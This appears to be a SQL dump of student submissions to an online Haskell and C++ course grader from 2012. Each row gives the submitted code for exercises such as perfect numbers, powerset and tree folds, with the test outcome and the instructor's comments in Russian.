(1900, 48, 'jogrms', '2012-10-12 07:51:05', 1, 'myreverse :: [a] -> [a]\r\nmyreverse = myfoldl (acc x -> x:acc) [] where\r\n    myfoldl f z a = foldr (x acc -> (z1 -> acc $ f z1 x)) id a $ z', '<br/>Тесты успешно пройдены!'),
(1901, 63, '533223', '2012-10-12 07:56:58', 1, 'fives = 5:(map (x-> 10*x+5) fives)', '<br/>Тесты успешно пройдены!'),
(1902, 56, '329842', '2012-10-12 08:10:22', 1, 'allLists n 0 = [[]]\r\nallLists n k = [x:y | x <- [1..n], y <- allLists n (k - 1)]', '<br/>Тесты успешно пройдены!'),
(1903, 61, '3607492', '2012-10-12 09:29:49', 0, 'sumDiv n = foldl (+) 0 [x|x<-[1..(div n 2)],mod n x == 0]\r\n\r\nperfects t = [a|n<-[1..t],let a = foldl (+) 0 [x|x<-[1..(div n 2)],mod n x == 0],a==n]', '<br/>Тесты успешно пройдены!'),
(1904, 61, '3607492', '2012-10-12 09:30:48', 1, 'sumDiv n = foldl (+) 0 [x|x<-[1..(div n 2)],mod n x == 0]\r\n\r\nperfects t = [a|n<-[1..t],let a = sumDiv n,a==n]', '<br/>Тесты успешно пройдены!'),
(1905, 62, '3607492', '2012-10-12 09:37:19', 1, 'sumDiv n = foldl (+) 0 [x|x<-[1..(div n 2)],mod n x == 0]\r\n\r\namicables t = [(a,x)|a<-[1..t],let x = sumDiv a,let z = sumDiv x,z==a,x>a]\r\n', '<br/>Тесты успешно пройдены!'),
(1906, 61, '3431532', '2012-10-12 09:47:25', 1, 'sumDiv n = foldr (+) 0 [ x | x<-[1..n`div`2], n `mod` x == 0 ]\r\n\r\nperfects n = [ x | x<-[1..n], x == (sumDiv x)] ', '<br/>Тесты успешно пройдены!'),
(1907, 50, 'jogrms', '2012-10-12 09:47:44', 1, '#include <iostream>\r\n\r\ntemplate <typename T>\r\nclass BinaryNode {\r\npublic:\r\n    BinaryNode(T value, BinaryNode& left, BinaryNode& right)\r\n        : Left(&left)\r\n        , Right(&right)\r\n        , Value(value)\r\n    {}\r\n\r\n    BinaryNode(T value)\r\n        : Left(NULL)\r\n        , Right(NULL)\r\n        , Value(value)\r\n    {}\r\n  --- Я бы этот конструктор не писал, а просто задал умолчания у предыдущего конструктора.\r\n  --- Ну и, просто как замечание, теперь немного правилтне писать не NULL, а nullptr\r\n\r\n    template <typename F>\r\n    bool any(F f) {\r\n        return f(Value) ? true :\r\n            ((Left ? Left->any(f) : false) || (Right ? Right->any(f) : false));\r\n    }\r\n\r\n    BinaryNode<T> *Left, *Right;\r\n    T Value;\r\n};\r\n\r\ntypedef BinaryNode<int> IBN;\r\n\r\nint main() {\r\n    IBN n1 = IBN(1);\r\n    IBN n2 = IBN(2);\r\n    IBN root = IBN(0, n1, n2);\r\n    std::cout << "> 0: " << root.any([](int i) { return i > 0; }) << std::endl;\r\n    std::cout << "< 0: " << root.any([](int i) { return i < 0; }) << std::endl;\r\n    std::cout << "== 0: " << root.any([](int i) { return i == 0; }) << std::endl;\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1908, 62, '3431532', '2012-10-12 09:50:45', 0, 'sumDiv n = foldr (+) 0 [ x | x<-[1..n`div`2], n `mod` x == 0 ]\r\n\r\nperfects n = [ (x , y) | x<-[1..n-1], y <- [x+1..n],  y == (sumDiv x), x == (sumDiv y)] ', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1909, 62, '3431532', '2012-10-12 09:51:14', 1, 'sumDiv n = foldr (+) 0 [ x | x<-[1..n`div`2], n `mod` x == 0 ]\r\n\r\namicables n = [ (x , y) | x<-[1..n-1], y <- [x+1..n],  y == (sumDiv x), x == (sumDiv y)] \r\n  --- OK, но это, кстати, _очень_ неэффективно (по той же причина, которую вы разбирали на примере coins)) \r\n  --- Но OK, мы это разберем', '<br/>Тесты успешно пройдены!'),
(1910, 61, 'jogrms', '2012-10-12 10:10:34', 1, 'sumDiv :: Int -> Int\r\nsumDiv n = sum $ filter (x -> mod n x == 0) [1 .. div n 2]\r\n\r\nperfects :: Int -> [Int]\r\nperfects n = filter (x -> sumDiv x == x) [6 .. n]', '<br/>Тесты успешно пройдены!'),
(1911, 63, '3431532', '2012-10-12 10:23:23', 1, 'fives = [five n | n<-[1..]]\r\n\r\nfive 1 = 5\r\nfive x = 5*(10^(x-1)) + five (x-1)', '<br/>Тесты успешно пройдены!'),
(1912, 62, 'jogrms', '2012-10-12 10:27:03', 1, 'sumDiv :: Int -> Int\r\nsumDiv n = sum $ filter (x -> mod n x == 0) [1 .. div n 2]\r\n\r\namicables :: Int -> [(Int, Int)]\r\namicables n = [(a, b) | a <- [1 .. n], b <- [a + 1 .. n], sumDiv a == b, sumDiv b == a]\r\n   --- На самом деле у вас тут написано _очень_ неэффекктивно, по той же причине, которую мы \r\n   --- обсуждали на примере coins) Но ОК, это мы разберем', '<br/>Тесты успешно пройдены!'),
(1913, 50, '3607492', '2012-10-12 10:36:23', 1, '#include <iostream>\r\nusing namespace std;\r\n\r\ntemplate <class C,class F>\r\nbool any(F func,C subj){\r\n  --- Немного лучше видимо const C& subj (хотя в данном случае неважно)\r\nif (subj==nullptr) return false;return\r\nfunc((subj)->getVal())||any(func, (subj)->getRight())||any(func, (subj)->getLeft());\r\n   --- Скобки вокруг subj вроже бы не нужны\r\n}\r\nclass TreeNode {\r\npublic:\r\nTreeNode(const int val) : val_(val), left_(NULL), right_(NULL) {}\r\n   --- Вместо NULL, понятно, можно nullptr\r\n~TreeNode( ) {}\r\nconst int getVal( ) const{return val_;}\r\nvoid setVal(const int val){val_ = val;}\r\nvoid setRightChild(TreeNode* p){right_ = p;}\r\nvoid setLeftChild(TreeNode* p){left_ = p;}\r\nTreeNode* getLeft( ){return left_;}\r\nTreeNode* getRight( ){return right_;}\r\nprivate:    int val_;TreeNode* left_;TreeNode* right_;\r\n};\r\nint main(int argc, char const *argv[])\r\n{TreeNode root(1);TreeNode node2(2);TreeNode node3(3);TreeNode node4(6);\r\nroot.setLeftChild(&node2);\r\nroot.setRightChild(&node3);\r\nnode3.setLeftChild(&node4);\r\nint n = 4;\r\nbool r = any([&n](int x){ return x%n==0;}, &root);\r\ncout<<((r)?"YES":"NO");\r\nreturn 0;}', '<br/>Тесты успешно пройдены!'),
(1914, 63, 'jogrms', '2012-10-12 10:37:34', 1, 'fives :: [Integer]\r\nfives = 5:map (x -> 10 * x + 5) fives', '<br/>Тесты успешно пройдены!'),
(1915, 58, '3607492', '2012-10-12 11:18:52', 2, 'import Data.List\r\nfunc x = permutations x\r\n\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) || (check ((x+y):xs) n) \r\n\r\n\r\ncreate [] _ = False\r\ncreate (x:xs) n = if (check x n) then True else create xs n\r\n\r\ncanMakeScheme x n= create (func x) n\r\n\r\n{для 15 этот код должен за 7.5 лет посчитать :D}\r\n  --- :)', '<br/>Тесты успешно пройдены!'),
(1916, 57, '3607492', '2012-10-12 11:19:27', 0, 'import Data.List\r\nfunc x = permutations x\r\n\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) || (check ((x+y):xs) n) \r\n\r\n\r\ncreate [] _ = False\r\ncreate (x:xs) n = if (check x n) then True else create xs n\r\n\r\ncanMakeScheme x n= create (func x) n\r\n\r\n{-для 9 за 240 секунд у меня прогнало-}', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(1917, 57, '3607492', '2012-10-12 11:37:44', 0, 'func x = permutations x\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (case xs of\r\n					z:zs->(check (x:(y+z):zs)n)||(check (x:(y*z/(y+z)):zs)n)\r\n					_ -> False) \r\n\r\n\r\ncreate [] _ = False\r\ncreate (x:xs) n = if (check x n) then True else create xs n\r\n\r\ncanMakeScheme x n= create (func x) n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(1918, 57, '3607492', '2012-10-12 11:39:06', 0, 'import Data.List\r\n\r\nfunc x = permutations x\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (case xs of\r\n					z:zs->(check (x:(y+z):zs)n)||(check (x:(y*z/(y+z)):zs)n)\r\n					_ -> False) \r\n\r\n\r\ncreate [] _ = False\r\ncreate (x:xs) n = if (check x n) then True else create xs n\r\n\r\ncanMakeScheme x n= create (func x) n', '<br/>Тесты успешно пройдены!'),
(1919, 61, '533223', '2012-10-12 11:54:24', 1, 'sumDiv n = foldr (+) 0 [ x | x<-[1..(div n 2)], div n x == 0 ]\r\n   --- Ну или можно использовать sum\r\nperfects n = [ x | x<-[1..n], x == sumDiv x ]', 'Выражение имеет неправильное значение: sumDiv 10'),
(1920, 62, '533223', '2012-10-12 12:08:36', 2, 'sumDiv n = sum [ x | x<-[1..(div n 2)], div n x == 0 ]\r\n   --- Тут у вас опечатка, так список вседа будет пустой..\r\n\r\namicables n = [(x,y) | x<-[1..n], let y = sumDiv x, x == sumDiv y, y < n+1 ]', 'Выражение имеет неправильное значение: amicables 300'),
(1921, 57, '3607492', '2012-10-12 12:29:20', 2, '  --- У вас видимо не совсем правильно, вот такой тест не проходит:\r\n  ---  canMakeScheme [13,2,3,7] 7 \r\n  --- Выдает False, а д.б. True (просто берем последний резистор)\r\n  --- (Такого теста не было, но теперь я его добавил)  \r\n\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (case xs of\r\n\r\n					z:zs->(check (x:(y+z):zs)n)\r\n							||(check (x:(y*z/(y+z)):zs)n)\r\n							||(check ((x+z):y:zs) n)\r\n							||(check ((x*z/(x+z)):y:zs) n)\r\n					_ -> False) \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = check x n\r\n', '<br/>Тесты успешно пройдены!'),
(1922, 62, '533223', '2012-10-12 12:33:35', 0, 'sumDiv n = sum [ x | x<-[1..(div n 2)], rem n x == 0 ]\r\n\r\namicables n = [(x,y) | x<-[1..n], let y = sumDiv x, x == sumDiv y, y < n+1 ]', 'Выражение имеет неправильное значение: amicables 300'),
(1923, 62, '533223', '2012-10-12 12:38:28', 1, 'sumDiv n = sum [ x | x<-[1..(div n 2)], rem n x == 0 ]\r\n\r\namicables n = [(x,y) | x<-[1..n], let y = sumDiv x, x == sumDiv y, y < n+1, x<y ]', '<br/>Тесты успешно пройдены!'),
(1924, 64, 'jogrms', '2012-10-12 13:12:28', 1, 'main = do\r\n    putStrLn $ show $ testTree\r\n    putStrLn $ show $ treeFoldr (-) 0 testTree -- prints 4\r\n    putStrLn $ show $ treeFoldl (-) 0 testTree -- prints -10\r\n    interact id\r\n \r\ndata Tree a = Empty | Node a (Tree a) (Tree a) deriving Show\r\n\r\ntreeFoldr :: (a -> b -> b) -> b -> Tree a -> b\r\ntreeFoldr f = treeFold r $ flip f where\r\n    r Empty = []\r\n    r (Node a n1 n2) = r n2 ++ [a] ++ r n1\r\n\r\ntreeFoldl :: (b -> a -> b) -> b -> Tree a -> b\r\ntreeFoldl = treeFold r where\r\n    r Empty = []\r\n    r (Node a n1 n2) = r n1 ++ [a] ++ r n2\r\n\r\ntreeFold :: (Tree a -> [a]) -> (b -> a -> b) -> b -> Tree a -> b\r\ntreeFold f g z a = foldl g z $ f a\r\n   --- ОК, интересный вариант! Я бы не совсем так написал, но это мы обсудим.\r\n\r\ntestTree =\r\n    Node 1\r\n        (Node 2\r\n            (Node 3 Empty Empty)\r\n            (Node 4 Empty Empty)\r\n        )\r\n        Empty\r\n', '<br/>Тесты успешно пройдены!'),
(1925, 58, '3607492', '2012-10-12 13:36:17', 2, '  --- Ну, во первых не совсем правильно (см.12-2)\r\n  --- Во вторых должно для любого теста работать за 15 мин (ну ОК, за 30 мин тоже сойдет) (( \r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (case xs of\r\n\r\n					z:zs->(check (x:(y+z):zs)n)\r\n							||(check (x:(y*z/(y+z)):zs)n)\r\n							||(check ((x+z):y:zs) n)\r\n							||(check ((x*z/(x+z)):y:zs) n)\r\n					_ -> False) \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = check x n\r\n\r\n\r\nmain = print (canMakeScheme [4.0,2.0,1.0,1.0,3.0,1.0,1.0,2.0,1.0,8.0,7.0,3.0,5.0,1.0,6.0] (37.0/9.0))\r\n\r\n{-Для 9 считает за 2-4 секунды. В результате выполнения этой штуки выдает True\r\n[Finished in 115.3s]\r\n\r\nОднако если запустить заведомо неверный набор, то по моим прикидкам будет считать 1.5-2 дня. Но посчитать должно :) \r\nТещу на Mac OS X 10.7.4, intel core 2 duo 2.26 Ghz-}', '<br/>Тесты успешно пройдены!'),
(1926, 56, 'jogrms', '2012-10-12 14:09:59', 1, 'allLists :: Int -> Int -> [[Int]]\r\nallLists n k = [[(x `div` (n^y) `mod` n) + 1 | y <- [0 .. k - 1]] | x <- [0 .. n^k - 1]]', '<br/>Тесты успешно пройдены!'),
(1927, 57, '2118411', '2012-10-12 17:27:48', 2, 'canMakeScheme [] r\r\n\r\n		| abs (r) <= 1e-10 = True\r\n\r\n		| otherwise =False\r\n\r\n\r\n\r\ncanMakeScheme (xs) r\r\n\r\n		| r < -1e-10 = False\r\n\r\n		| abs r <= 1e-10 = True\r\n\r\n--		| sumR < r = False\r\n\r\n		| otherwise = foldr (||) False [(canMakeScheme lst newR) | let len = length xs, i<-[1..len],let curR = xs!!(i-1), let lst=((take (i-1) xs)++(drop i xs)), newR<-[r-curR]++(if (r < curR) then [(r*curR)/(curR-r)] else [])]\r\n\r\n--		where sumR = sum xs\r\n', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(1928, 47, 'jamesbrain', '2012-10-12 17:40:40', 0, 'withElem l elem = map (mem -> elem:mem) l\r\n\npowerset [] = []\r\n\npowerset t = foldl (pset elem-> concat[(withElem pset elem),pset]) [[]] t\n', 'Выражение имеет неправильное значение: powerset []'),
(1929, 47, 'jamesbrain', '2012-10-12 17:41:12', 0, 'withElem l elem = map (mem -> elem:mem) l\r\n\npowerset [] = [[]]\r\n\npowerset t = foldl (pset elem-> concat[(withElem pset elem),pset]) [[]] t\n', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1930, 47, 'jamesbrain', '2012-10-12 17:44:28', 1, 'withElem l elem = map (mem -> elem:mem) l\r\n   --- или короче можно = map (elem:) l\r\n   ---   (это т.н. section)\r\n\r\npowerset [] = [[]]\r\n\r\npowerset t = foldr (elem pset-> concat[pset, (withElem pset elem)]) [[]] t\r\n', '<br/>Тесты успешно пройдены!'),
(1931, 56, '6774563', '2012-10-12 18:09:53', 1, 'allLists n 0 = []\r\n  --- Это кстати не совсем правильно.. Тут у вас написано, что таких списков нет. А не самом деле есть\r\n  --- один такой список - пустой. И, кстати, если написать правильно, то второе правило не потребуется,\r\n  --- оно будет следовать из первого и третьего.  \r\nallLists n 1 = [[x] | x <- [1..n]]\r\nallLists n k = [x:xs | xs <- allLists n (k-1), x <- [1..n]]\r\n', '<br/>Тесты успешно пройдены!'),
(1932, 61, '5772638', '2012-10-12 19:07:31', 0, 'sumDivs n= sum [x|x<-[1..n-1],mod n x==0]\r\nperfects n=[x|x<-[1..n],x==sumDivs x]', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1933, 61, '5772638', '2012-10-12 19:08:20', 1, 'sumDiv n= sum [x|x<-[1..n-1],mod n x==0]\r\nperfects n=[x|x<-[1..n],x==sumDiv x]', '<br/>Тесты успешно пройдены!'),
(1934, 64, '12206137', '2012-10-12 19:23:29', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty\r\n\r\n\r\n\r\nfoldTree append merge savePath init tree =\r\n\r\n    case fold Nothing init tree of\r\n\r\n        Just val -> val\r\n\r\n    where\r\n\r\n        fold Nothing acc Empty = Just acc\r\n\r\n        fold (Just global) acc Empty = Just $ merge global acc\r\n\r\n        fold globalAcc curAcc (Node val left right) =\r\n\r\n            let newAcc = append val curAcc in\r\n\r\n            let leftRes = fold globalAcc newAcc left in\r\n\r\n            fold leftRes (if savePath then newAcc else init) right\r\n\r\n\r\n\r\niTree =\r\n\r\n    Node 1\r\n\r\n        (Node 2\r\n\r\n            (Node 3 Empty Empty)\r\n\r\n            Empty)\r\n\r\n        (Node 5 Empty Empty)\r\n\r\n\r\n\r\nsumTree = foldTree (+) (+) False 0\r\n\r\nmulTree = foldTree (*) (*) False 1\r\n\r\nheight = foldTree (\\_ x -> x+1) max True (-1)\r\n   --- ОК, замечательно! Я бы не совсем так написал, мы это обсудим, но у вас по-моему хорошая идея.\r\n', '<br/>Тесты успешно пройдены!'),
(1935, 64, 'Deutsche', '2012-10-12 19:25:22', 1, 'data Tree = Empty | Node Double Tree Tree\r\nfoldTree (f) (g) start Empty = start\r\nfoldTree (f) (g) start (Node x l r) = f (foldTree (f) (g) start l) (f (g x) (foldTree (f) (g) start r))\r\n   --- ОК, засчитано, очень хорошо! Но вроде бы высоту с вашим foldTree функцию height не написать, да?\r\n\r\n-- Пример 1: сумма элементов дерева\r\n-- *Main> foldTree (+) (id) 0 (Node 3 (Node 2 (Node 4 Empty (Node 23 Empty Empty)) (Node 14 Empty Empty)) (Node 11 Empty Empty))\r\n-- 57.0\r\n-- Пример 2: произведение элементов дерева\r\n-- *Main> foldTree (*) (id) 1 (Node 3 (Node 2 (Node 4 Empty (Node 23 Empty Empty)) (Node 14 Empty Empty)) (Node 11 Empty Empty))\r\n-- 85008.0\r\n-- Пример 3: сумма квадратов элементов дерева\r\n-- *Main> foldTree (+) (x -> x*x) 0 (Node 3 (Node 2 (Node 4 Empty (Node 23 Empty Empty)) (Node 14 Empty Empty)) (Node 11 Empty Empty))\r\n-- 875.0\r\n-- Пример 4: произведение синусов элементов дерева\r\n-- *Main> foldTree (*) (x -> sin x) 1 (Node 3 (Node 2 (Node 4 Empty (Node 23 Empty Empty)) (Node 14 Empty Empty)) (Node 11 Empty Empty))\r\n-- -8.140627789685288e-2\r\n', '<br/>Тесты успешно пройдены!'),
(1936, 62, '5772638', '2012-10-12 19:28:32', 1, 'sumDiv n= sum [x|x<-[1..n-1],mod n x==0]\r\namicables n =[(x,y)|x<-[1..n],y<-[(x+1)..n], x==sumDiv y, y==sumDiv x]\r\n   --- ОК, очень хорошо! Но, кстати, у вас тут не совсем эффективно, по точно той же причине,\r\n   --- которую мы обсуждали в задаче про coins. Ну, это мы обсудим..', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1937, 57, '2118411', '2012-10-12 19:34:50', 0, 'getSome xs =  map (x->(map (y->xs!!y) x, xs\\(map (y->xs!!y) x))) (ys)\r\n\n        where\r\n\n                ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\n                lenxs = (length xs)-1\r\n\n                lenys = (length ys)-1\r\n\n\r\n\ncanMakeScheme [] r\r\n\n                | abs (r) <= 1e-10 = True\r\n\n                | otherwise =False\r\n\n\r\n\ncanMakeScheme (xs) r\r\n\n                | r < -1e-10 = False\r\n\n                | abs r <= 1e-10 = True\r\n\n--              | sumR < r = False\r\n\n                | otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs= getSome xs, let len = (length rs)-1, i<-[0..len],let curR =$\r\n\n--              where sumR = sum xs\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(1938, 57, '2118411', '2012-10-12 19:38:14', 0, 'import Data.List\r\n\n\r\n\ngetSome xs =  map (x->(map (y->xs!!y) x, xs\\(map (y->xs!!y) x))) (ys)\r\n\n        where\r\n\n                ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\n                lenxs = (length xs)-1\r\n\n                lenys = (length ys)-1\r\n\n\r\n\ncanMakeScheme [] r\r\n\n                | abs (r) <= 1e-10 = True\r\n\n                | otherwise =False\r\n\n\r\n\ncanMakeScheme (xs) r\r\n\n                | r < -1e-10 = False\r\n\n                | abs r <= 1e-10 = True\r\n\n				| sumR < r = False\r\n\n                | otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs= getSome xs, let len = (length rs)-1, i<-[0..len],let curR =$\r\n\n				where sumR = sum xs\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(1939, 57, '2118411', '2012-10-12 19:39:24', 2, 'import Data.List\r\n\r\n\r\n\r\ngetSome xs =  map (x->(map (y->xs!!y) x, xs(map (y->xs!!y) x))) (ys)\r\n\r\n	where \r\n\r\n		ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\r\n		lenxs = (length xs)-1\r\n\r\n		lenys = (length ys)-1\r\n\r\n\r\n\r\ncanMakeScheme [] r\r\n\r\n		| abs (r) <= 1e-10 = True\r\n\r\n		| otherwise =False\r\n\r\n\r\n\r\ncanMakeScheme (xs) r\r\n\r\n		| r < -1e-10 = False\r\n\r\n		| abs r <= 1e-10 = True\r\n\r\n		| (sumR < r) = False\r\n\r\n		| otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs= getSome xs, let len = (length rs)-1, i<-[0..len],let curR = sum (fst (rs!!i)), let lst=snd (rs!!i), newR<-[r-curR]++(if (r < curR) then [(r*curR)/(curR-r)] else [])]\r\n\r\n		where sumR = sum xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1940, 64, 'hasp', '2012-10-12 19:40:02', 1, 'data Tree a = EmptyNode | Node (Tree a) a (Tree a)\r\n\r\nfoldTree _ acc EmptyNode = acc\r\nfoldTree f acc (Node left v right) = let l = foldTree f acc left in let r = foldTree f l right in f v r \r\n\r\na1 = foldTree (+) 0 (Node (Node EmptyNode 3 ((Node (Node EmptyNode (-2) EmptyNode)  8 EmptyNode )) ) 4 (Node (Node EmptyNode 7 EmptyNode) (-1) EmptyNode ) )\r\na2 = foldTree (*) 1 (Node (Node EmptyNode 3 ((Node (Node EmptyNode (-2) EmptyNode)  8 EmptyNode )) ) 4 (Node (Node EmptyNode 7 EmptyNode) (-1) EmptyNode ) )', '<br/>Тесты успешно пройдены!'),
(1941, 58, '2118411', '2012-10-12 19:43:52', 2, 'import Data.List\r\n\r\n\r\n\r\ngetSome xs =  map (x->(map (y->xs!!y) x, xs(map (y->xs!!y) x))) (ys)\r\n\r\n	where \r\n\r\n		ys = tail ((map concat . sequence) [ [[],[x]] | x <- [0..lenxs]])\r\n\r\n		lenxs = (length xs)-1\r\n\r\n		lenys = (length ys)-1\r\n\r\n\r\n\r\ncanMakeScheme [] r\r\n\r\n		| abs (r) <= 1e-10 = True\r\n\r\n		| otherwise =False\r\n\r\n\r\n\r\ncanMakeScheme (xs) r\r\n\r\n		| r < -1e-10 = False\r\n\r\n		| abs r <= 1e-10 = True\r\n\r\n		| (sumR < r) = False\r\n\r\n		| otherwise = foldr (||) False [(canMakeScheme lst newR) | let rs= getSome xs, let len = (length rs)-1, i<-[0..len],let curR = sum (fst (rs!!i)), let lst=snd (rs!!i), newR<-[r-curR]++(if (r < curR) then [(r*curR)/(curR-r)] else [])]\r\n\r\n		where sumR = sum xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1942, 63, '5772638', '2012-10-12 19:45:31', 1, 'fives :: [Integer]\r\nfives= 5:map(5+)(map (10*) fives)', '<br/>Тесты успешно пройдены!'),
(1943, 63, '2562137', '2012-10-12 19:58:47', 1, 'fives = 5 : [x * 10 + 5 | x <- fives]', '<br/>Тесты успешно пройдены!'),
(1944, 63, 'hasp', '2012-10-12 20:03:10', 1, 'import Data.List\r\n\r\nfives = snd (mapAccumL (a n -> (a*10 + 5, a*10 + 5)) 0 [1..])\r\n   --- OK, но, кстати, можно гораздо проще..', '<br/>Тесты успешно пройдены!'),
(1945, 62, '2562137', '2012-10-12 20:04:37', 1, 'sumDiv n = (f n 1 0) - n\r\nf n k sum =\r\n	if (k * k > n) then sum\r\n	else if (k * k == n) then (sum + k)\r\n	else if (mod n k == 0) then f n (k+1) (sum + k + div n k)\r\n	else f n (k+1) sum\r\n\r\namicables n = [(x, sumDiv x) | x <- [1..n], x < sumDiv x, x == sumDiv (sumDiv x)]\r\n   --- ОК, очень хорошо, но только можно было воспользоваться let (внутри list comprehension)\r\n   --- чтобы не считать sumDiv x три раза', '<br/>Тесты успешно пройдены!'),
(1946, 47, '5772638', '2012-10-12 20:09:57', 0, 'subset xs 1 = [[x]|x<-xs]\r\nsubset xs n = subset xs (n-1)++[y:ys|y<-xs,ys<-subset xs (n-1), length ys==(n-1), y< head ys]\r\n\r\npowerset xs= [[]]++subset xs (length xs)', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1947, 47, '5772638', '2012-10-12 20:12:36', 1, 'subset xs 1 = [[x]|x<-xs]\r\nsubset xs n = subset xs (n-1)++[y:ys|y<-xs,ys<-subset xs (n-1), length ys==(n-1), y< head ys]\r\n\r\npowerset []=[[]]\r\npowerset xs= [[]]++subset xs (length xs)', '<br/>Тесты успешно пройдены!'),
(1948, 57, '3607492', '2012-10-12 21:22:24', 0, 'check (y:[]) n= (y==n)||(0==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (check (y:xs) n)\r\n				|| (check (x:xs) n)\r\n				|| (case xs of\r\n\r\n					z:zs->(check (x:(y+z):zs)n)\r\n							||(check (x:(y*z/(y+z)):zs)n)\r\n							||(check ((x+z):y:zs) n)\r\n							||(check ((x*z/(x+z)):y:zs) n)\r\n					_ -> False) \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = check x n\r\n\r\n\r\nmain = print (canMakeScheme [1,2,3,4,5,6,7,8,9] -1 )\r\n{-Для 9 теперь у меня менее 20 секунд-}', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(1949, 63, '472848', '2012-10-12 21:37:46', 1, 'fivesn 0 = 0\r\nfivesn n = 10 * fivesn (n - 1) + 5\r\n\r\nfives = [fivesn i| i <- [1..]]', '<br/>Тесты успешно пройдены!'),
(1950, 48, '472848', '2012-10-12 21:43:28', 1, 'myreverse li = foldr ( f x -> f (b : x)) id li []', '<br/>Тесты успешно пройдены!'),
(1951, 58, '3607492', '2012-10-12 22:11:37', 2, 'check _ 0 = True\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (check (y:xs) n)\r\n				|| (check (x:xs) n)\r\n				|| (case xs of\r\n\r\n					z:zs->(check (x:(y+z):zs)n)\r\n							||(check (x:(y*z/(y+z)):zs)n)\r\n							||(check ((x+z):y:zs) n)\r\n							||(check ((x*z/(x+z)):y:zs) n)\r\n					_ -> False) \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = if ( any (n==) x ) then True else check x n\r\n\r\n\r\nmain = print (canMakeScheme [1,2,3,4,5,6,7,8,9] 2 )', '<br/>Тесты успешно пройдены!'),
(1952, 57, '3607492', '2012-10-13 00:27:24', 2, '  --- Что то не совсем правильно пока.. Вот тест\r\n  --- canMakeScheme [50,13,2,3,7] 56\r\n  --- У вас False, а д.б. True (делаем 6 - это у вас как раз получается, и присоединяем 50)\r\n  --- Попробуйте исправить, пожалуйста (а я сейчас добавлю такой тест) \r\ncheck _ 0 = True\r\ncheck (y:[]) n= (y==n)\r\ncheck (x:y:xs) n= (check ((x*y/(x+y)):xs) n) \r\n				|| (check ((x+y):xs) n) \r\n				|| (check (y:xs) n)\r\n				|| (check (x:xs) n)\r\n				|| (case xs of\r\n\r\n					z:zs->(check (x:(y+z):zs)n)\r\n							||(check (x:(y*z/(y+z)):zs)n)\r\n							||(check ((x+z):y:zs) n)\r\n							||(check ((x*z/(x+z)):y:zs) n)\r\n					_ -> False) \r\n\r\n\r\n\r\ncanMakeScheme [] _ = False\r\ncanMakeScheme x n = if ( any (n==) x ) then True else check x n\r\n\r\n{-Дляя 9 менее 20 секунд (Intel Core i5-2400, 3200 MHz, Windows 7, Sublime text 2)-}', '<br/>Тесты успешно пройдены!'),
(1953, 63, '44060', '2012-10-13 08:37:20', 1, 'fives = x 0\r\n		where x a = let b = 10*a + 5\r\n							in  b : x b', '<br/>Тесты успешно пройдены!'),
(1954, 61, '44060', '2012-10-13 08:41:30', 1, 'sumDiv n = sum [i | i<-[1..(n-1)], n `mod` i == 0]\r\nperfects n = [i | i<-[1..n], sumDiv i == i] ', '<br/>Тесты успешно пройдены!'),
(1955, 61, '2118411', '2012-10-13 10:49:43', 1, '-- sent by mail', 'Не удалось вычислить выражение "sumDiv 10", проверьте правильность синтаксиса'),
(1956, 62, '2118411', '2012-10-13 10:50:00', 1, '-- sent by mail', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(1957, 63, '2118411', '2012-10-13 10:50:08', 1, '-- sent by mail', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
